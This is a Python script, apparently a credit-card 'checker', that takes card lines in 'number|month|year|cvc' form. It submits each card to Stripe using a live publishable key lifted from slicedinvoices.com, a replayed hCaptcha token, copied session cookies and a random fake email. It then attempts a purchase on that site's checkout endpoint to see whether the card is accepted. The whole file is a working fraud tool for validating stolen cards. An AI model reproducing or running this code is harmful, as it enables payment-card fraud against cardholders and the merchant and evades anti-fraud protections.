import requests
import random
import time

def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	emil = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=30))
			
	headers = {
			    'authority': 'api.stripe.com',
			    'accept': 'application/json',
			    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
			    'content-type': 'application/x-www-form-urlencoded',
			    'origin': 'https://js.stripe.com',
			    'referer': 'https://js.stripe.com/',
			    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
			    'sec-ch-ua-mobile': '?1',
			    'sec-ch-ua-platform': '"Android"',
			    'sec-fetch-dest': 'empty',
			    'sec-fetch-mode': 'cors',
			    'sec-fetch-site': 'same-site',
			    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
			}
			
	data = f'type=card&billing_details[name]=ebrahEIM&billing_details[address][postal_code]=10001&billing_details[address][country]=US&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=fb83f278-a5da-4c63-af1a-c3e75f74a5579320a4&muid=5c0335ba-d432-4877-951a-45ec4d64b5fce2fc48&sid=958c6505-e59b-4bf7-9840-bf970f8ef04948082f&pasted_fields=number&payment_user_agent=stripe.js%2F56e5c7d67d%3B+stripe-js-v3%2F56e5c7d67d%3B+card-element&referrer=https%3A%2F%2Fslicedinvoices.com&time_on_page=116769&key=pk_live_0VVG3Db0uo7ffYkmFNilkVE6&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQYcxjFkuhs5eq_WvJ9wGAyx6fKllF7_fhi5HqHGM42Xs8LxKmeW9RsGOb24MFz91xPCPNuFJiRVWMIAjfDJuwbRTlXYJG-1pXM8fRU0WcS4ea_2aQHr18_QB6sxOrdlr0z1w6dQ0ObPgP8vl_a9wrpd_3hb4vaTF0ifw-k-xwUBmo8nGQxL_Ot0WgoLLAT5dthGtVC9qE7qrgQ01S9Apn2eWdJseJ0SdBS-EyZ101ooZJxxMwvHf507Ch9qAoHcmpeNlUaAB6kvz5H9IRfgeVt6XVjw37niCab6FD6JlGeZ3D-fAaSg51DDR8CxE_4cNfE7BVcuZF51a7U4CZA0rOxD6ecquXXn2JcPkjUKGM8KYM3vQFx0NtWpyx-VTS26LOTCVcaytdEZ7tqvxInvP0dQ-FoD1BRHcaLGUyeim2APzFKz-gPNdGXIU3-uxFYa2VSd-qHoG6BfB-7OYk1KGDsT0-Cdnj5XnsBCgJLPBruL1qtr13BPCfMwlBI2i9k1NDhSsn1zGvjMwNOAghy0MNlhJ5cf4Obx4hYiMxxN2Kj-7M9Nos8xvQVutVt-2Xi4NgUNs3pVD7ZxUS2V82mwOsVmmmZuoiS-SZt80SPzxAav-YMqxpGA73IDtv3wlIvBQg5wokqDZAnrMuQen7hCLvyd3JKzGxAQHDZ4dsTUiC9-DwHUzd3dNE3vdiuPUzT8ErdPfMWUQZ1AVecMr-mNtkxPaq6TmDNlRSqFiPMzX5RvNs_ZEoqZ_pg6NmIJXurfynunpmDIIhQAlqOrURw9eXOE5tm0IpS2_9pMuPdL947J9cAXwJVXiDeIAozKojTrkYqfxUQsVUYZ18ojqt1KuPdGF3F2ZiL11TbzlHVqBZzqzaf9pZhllbFVI723ZNfVteNF8ZzAyKtFZq39ON-ObeqVq6bHcp5ZZTz45Vk96HBbPLm2mev7H6toGHMas5ZpzyATNfr0yzDSn_IW_BMknYOqUygU40BCfXVljrhlIKBTGIjVRwei1QCEAHAdFx0iYFsRA3goEFJ4eGd2UW3wkyJaefhFl_OEDmXWJcOvFfZLmTZIpBIHYn736G0ShQeARGBhw86BR_JomQg5-Q9e509-PapZ9c6vmxtyiYJ_VikBD3Tq50kMSMq6_k-CxrIH6asW6ZSY10CDPq1Ju83gng59nCe_UjIMDBtXYOlz8RcpO51oNBRb_g5jYSNvsqz6Mca2tmzsFnwDPQ8DJ_QaNVuXrcDW7hS9IHXRszNy1-zBwAXjZuVypPmHHtrhjywS_6y8EAtmdgtBjierAUhbbozZqmPwhB-zaQVKL7mc119tqe53JlU6rTIhZNOA7GHTa2VSb-fpxSNDODmm9bOyC9_eAhF_N39aWD9M4CPeztMuWqcvcf-vdHMg8cosLjYaCtCTc6NtnMw9DPwH7w3cBS9njChQCya5T-VIN6SsCgB-s2Vd97YD6RZN9qYILFCIYeChrmHzXkNUU8w42eqH4BlEfCEFRtQK2Alocaqd0y4M8XDA5y7OXrvJ83vq8EGAFuzlb9SZj2fH34129yXpoFVh8U6PlBUxiMd8ZQDynKU4wQvFwNyCKHdaxJj6FgptjeuCJ3T-l0eSQmUwQc63H2rzGevP1clNO9PuiCTQTX4iC7N-lx0CMumTKbM399yxb2HBazYJvSMQXeL52udY8Cs38P_4i9S6iqHatdgxrqn0ks8KyOCsmXldOUnwSPqBLHv1u3bRJtTePpA0DvlhsyqaDqF7-lK0AxIkTHDHn2e0WErc6PI5v6SvRb1NJ27Coa2wLSa70Fk4SbWtWLT8Vth1QCpyOrzx5vVOi2zmdhauHdbdYL6oMn7EV6N0esvw6wi5clBnzJTCktWT8G485f7FDqd2X9rkjxavKh5wJypydc_Bd8q6LN1fuoYfw0RgBL3g50X96E_CH86a5S_R53aclYwVfddhGxRBqOfy9tjzAAtxSe3k8hJj9RzjnMrqrvX9kXesI7bcJZPCkKy3-FqxGBRdgaco4QS7f6P3ij8Gq7fJhWB5SA9tgK47SMJNttPJIuFXnYgmMUt1d67w9L1ebAxVdmq4ydBGRPjlxaNleHDOZl5DAahzaGFyZF9pZM4DMYNvomtyqDRhNzM5NjA4onBkAA.h86XKMnq-xcmMkiu7hXArRu5O8ML1mHWdHf7spU3wro'
			
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
			
	try:
		idd = (response.json()['id'])
	except:
		print('No Id response json white......')
			
			
	cookies = {
			    '_wpas_session': 'a8afff187581877512264da23337a3d1%7C%7C1717454893%7C%7C1717454533',
			    'PHPSESSID': 'fu8nl8r3i0lp9ggvepa4cnlau3',
			    '_ga': 'GA1.2.48747015.1717453096',
			    '_gid': 'GA1.2.1362908657.1717453096',
			    '_pk_ses.34.861e': '*',
			    '__stripe_mid': '5c0335ba-d432-4877-951a-45ec4d64b5fce2fc48',
			    '__stripe_sid': '958c6505-e59b-4bf7-9840-bf970f8ef04948082f',
			    'edd_items_in_cart': '1',
			    '_pk_id.34.861e': '4f62b5598b512dbe.1717453097.1.1717453340.1717453097.',
			    '_ga_6VH1NFLT4M': 'GS1.2.1717453096.1.1.1717453340.0.0.0',
			}
			
	headers = {
			    'Accept': 'application/json, text/javascript, */*; q=0.01',
			    'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
			    'Connection': 'keep-alive',
			    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
			    'Origin': 'https://slicedinvoices.com',
			    'Referer': 'https://slicedinvoices.com/checkout/',
			    'Sec-Fetch-Dest': 'empty',
			    'Sec-Fetch-Mode': 'cors',
			    'Sec-Fetch-Site': 'same-origin',
			    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
			    'X-Requested-With': 'XMLHttpRequest',
			    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
			    'sec-ch-ua-mobile': '?0',
			    'sec-ch-ua-platform': '"Linux"',
			}
			
	data = {
			    'action': 'edds_process_purchase_form',
			    'form_data': 'edd-discount=&payment-mode=stripe&edd_action=gateway_select&page_id=4&edd_email='+str(emil)+'%40gmail.com&edd_first=Angel&edd_last=Rippin&card_name=ebrahEIM&billing_country=US&card_zip=10001&edd_agree_to_terms=1&edd_action=purchase&edd-gateway=stripe&edd-process-checkout-nonce=cbbcd7af5e&dgas_time=1717453340',
			    'payment_method_id': idd,
			    'payment_method_exists': 'false',
			}
			
	response = requests.post('https://slicedinvoices.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
			
	try:
		ii=(response.text)
	except:
		return 'success'
	return ii
	